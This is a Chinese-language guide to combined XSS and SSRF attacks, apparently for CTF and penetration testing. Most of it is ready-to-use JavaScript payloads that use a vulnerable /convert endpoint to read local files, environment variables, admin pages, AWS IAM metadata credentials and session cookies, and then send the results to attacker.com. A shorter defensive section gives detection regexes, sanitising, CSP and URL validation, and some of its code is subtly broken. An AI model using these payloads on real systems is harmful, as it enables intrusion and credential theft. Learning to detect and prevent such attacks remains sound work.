# XSS + SSRF 组合攻击

## 1. 概述

### 1.1 攻击原理

XSS + SSRF 组合攻击是一种高级攻击技术，攻击者首先通过 XSS 漏洞在受害者浏览器中执行恶意 JavaScript，然后利用受害者的浏览器会话发起 SSRF 请求，从而绕过基于 IP 的访问控制或获取内部网络资源。

### 1.2 攻击优势

相比单一漏洞利用，组合攻击具有以下优势：
- **绕过客户端限制**：利用服务器端 SSRF 能力，不受浏览器同源策略限制
- **权限继承**：继承受害者的访问权限（如管理员会话）
- **隐蔽性**：攻击流量来自受害者浏览器，难以溯源
- **持久化**：存储型 XSS 可实现长期控制

### 1.3 攻击条件

- 应用存在 XSS 漏洞（可注入 JavaScript）
- 应用存在 SSRF 端点（可发起任意 HTTP 请求）
- 目标资源有访问控制（IP 限制、认证要求等）

---

## 2. 攻击场景

### 2.1 Flask 应用 XSS + SSRF 提取 Flag

**目标环境：**
- Flask Markdown 转换器存在 XSS 漏洞
- `/convert` 端点存在 SSRF 漏洞
- `/admin/flag` 端点使用 IP 基础认证

**攻击步骤：**

**步骤 1：构造 XSS Payload**
```html
<script>
// 通过 SSRF 访问管理端点
fetch('/convert', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
    // 提取 Flag 并外带
    const flag = html.match(/flag\{[^}]+\}/)[0];
    fetch('https://attacker.com/exfil?flag=' + encodeURIComponent(flag));
    
    // 或者在页面上显示
    document.body.innerHTML = '<h1>Flag: ' + flag + '</h1>';
});
</script>
```

**步骤 2：注入 Payload**
```bash
# 通过 markdown_text 参数注入
curl -X POST http://target/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "markdown_text=<script>fetch('/convert',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'url=http://127.0.0.1/admin/flag'}).then(r=>r.text()).then(h=>document.body.innerHTML=h)</script>"
```

**步骤 3：受害者访问触发**
- 受害者访问包含恶意 markdown 的页面
- JavaScript 在受害者浏览器执行
- SSRF 请求从受害者浏览器发起
- Flag 被提取并外带

**攻击流程图：**
```
攻击者注入 XSS Payload
    ↓
受害者访问恶意页面
    ↓ [JavaScript 执行]
浏览器发起 fetch('/convert') 请求
    ↓ [POST url=http://127.0.0.1/admin/flag]
Flask 应用执行 SSRF
    ↓ [urllib.request.urlopen("http://127.0.0.1/admin/flag")]
内部请求 (127.0.0.1 → 127.0.0.1)
    ↓ [IP 检查通过]
Flag HTML 响应
    ↓ [返回给浏览器]
JavaScript 提取 Flag
    ↓ [外带至 attacker.com]
攻击者获取 Flag
```

### 2.2 存储型 XSS + SSRF 持久化攻击

**场景描述：**
- 应用允许上传 markdown 内容并存储
- 其他用户可以查看存储的内容
- 存在 SSRF 端点

**攻击步骤：**

**步骤 1：存储恶意 Markdown**
```markdown
# 我的笔记

<script>
// 定期检查管理端点
setInterval(() => {
    fetch('/convert', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'url=http://127.0.0.1/admin/users'
    })
    .then(r => r.text())
    .then(data => {
        // 外带用户数据
        navigator.sendBeacon('https://attacker.com/collect', data);
    });
}, 60000); // 每分钟执行一次
</script>
```

**步骤 2：等待受害者触发**
- 管理员查看笔记
- JavaScript 在管理员浏览器执行
- 持续泄露管理数据

### 2.3 结合文件读取的组合攻击

**攻击 Payload：**
```html
<script>
// 通过 SSRF 读取敏感文件
Promise.all([
    fetch('/convert', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'url=file:///etc/passwd'
    }).then(r => r.text()),
    
    fetch('/convert', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'url=file:///app/app.py'
    }).then(r => r.text()),
    
    fetch('/convert', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'url=file:///proc/self/environ'
    }).then(r => r.text())
])
.then(([passwd, source, environ]) => {
    // 外带所有敏感数据
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify({passwd, source, environ})
    });
});
</script>
```

---

## 3. 高级攻击技术

### 3.1 内网端口扫描

**攻击 Payload：**
```javascript
async function scanPorts() {
    const ports = [80, 443, 3306, 5432, 6379, 27017, 8080, 9200];
    const results = {};
    
    for (const port of ports) {
        try {
            const response = await fetch('/convert', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `url=http://192.168.1.100:${port}/`
            });
            
            if (response.ok) {
                results[port] = 'OPEN';
            } else {
                results[port] = 'CLOSED';
            }
        } catch (e) {
            results[port] = 'FILTERED';
        }
    }
    
    // 外带扫描结果
    fetch('https://attacker.com/scan-results', {
        method: 'POST',
        body: JSON.stringify(results)
    });
}

scanPorts();
```

### 3.2 云元数据服务攻击

**AWS 环境：**
```javascript
// 提取 IAM 凭证
fetch('/convert', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
})
.then(r => r.text())
.then(roleName => {
    // 获取具体凭证
    return fetch('/convert', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`
    });
})
.then(r => r.text())
.then(credentials => {
    // 外带 IAM 凭证
    fetch('https://attacker.com/aws-creds', {
        method: 'POST',
        body: credentials
    });
});
```

### 3.3 会话劫持 + SSRF

**攻击场景：**
- 应用使用客户端会话（Flask signed cookies）
- 会话 Cookie 无 HttpOnly 标志
- 存在 SSRF 端点

**攻击 Payload：**
```javascript
// 窃取会话 Cookie
const sessionCookie = document.cookie.split('session=')[1]?.split(';')[0];

// 通过 SSRF 验证会话有效性
fetch('/convert', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': `session=${sessionCookie}`
    },
    body: 'url=http://127.0.0.1/admin/profile'
})
.then(r => r.text())
.then(profile => {
    // 外带用户资料
    fetch('https://attacker.com/profile?session=' + sessionCookie, {
        body: profile
    });
});
```

---

## 4. 检测与防御

### 4.1 检测方法

**前端检测：**
- 实施 Content Security Policy (CSP)
- 监控异常的 fetch/XMLHttpRequest 调用
- 检测对内部 IP 地址的请求

**后端检测：**
- 记录所有 SSRF 端点的请求
- 监控对 localhost/内部 IP 的访问
- 实施请求速率限制

**日志分析：**
```
# 检测 XSS + SSRF 组合攻击的日志特征
POST /convert.*url=http://127\.0\.0\.1
POST /convert.*url=file:///
POST /convert.*url=http://169\.254\.169\.254
```

### 4.2 防御措施

**XSS 防御：**
1. **移除 |safe 过滤器**
   ```html
   <!-- 脆弱代码 -->
   {{ html_content|safe }}
   
   <!-- 修复代码 -->
   {{ html_content }}
   ```

2. **实施 HTML 净化**
   ```python
   import bleach
   
   # 只允许安全的 HTML 标签
   allowed_tags = ['p', 'br', 'strong', 'em', 'ul', 'li']
   clean_html = bleach.clean(html_content, tags=allowed_tags, strip=True)
   ```

3. **添加 CSP 头**
   ```python
   @app.after_request
   def add_security_headers(response):
       response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
       return response
   ```

**SSRF 防御：**
1. **URL 验证**
   ```python
   from urllib.parse import urlparse
   import ipaddress
   
   def is_safe_url(url):
       parsed = urlparse(url)
       
       # 只允许 HTTP/HTTPS
       if parsed.scheme not in ['http', 'https']:
           return False
       
       # 解析 IP 并检查
       try:
           ip = socket.gethostbyname(parsed.hostname)
           ip_obj = ipaddress.ip_address(ip)
           
           # 拒绝私有 IP
           if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
               return False
           
           return True
       except:
           return False
   ```

2. **实施 Allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   
   def is_allowed_url(url):
       parsed = urlparse(url)
       return parsed.hostname in ALLOWED_DOMAINS
   ```

---

## 5. 攻击案例总结

| 案例 | XSS 类型 | SSRF 端点 | 目标 | 影响 |
|------|---------|----------|------|------|
| Flask Markdown 转换器 | 反射型 | /convert | /admin/flag | Flag 泄露 |
| 云环境应用 | 存储型 | /api/fetch | 元数据服务 | IAM 凭证泄露 |
| 内网管理系统 | DOM 型 | /proxy | 内网服务 | 内网沦陷 |

---

## 6. 参考资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS + SSRF Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-filter-bypass)

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用场景：** CTF 挑战、渗透测试、安全审计
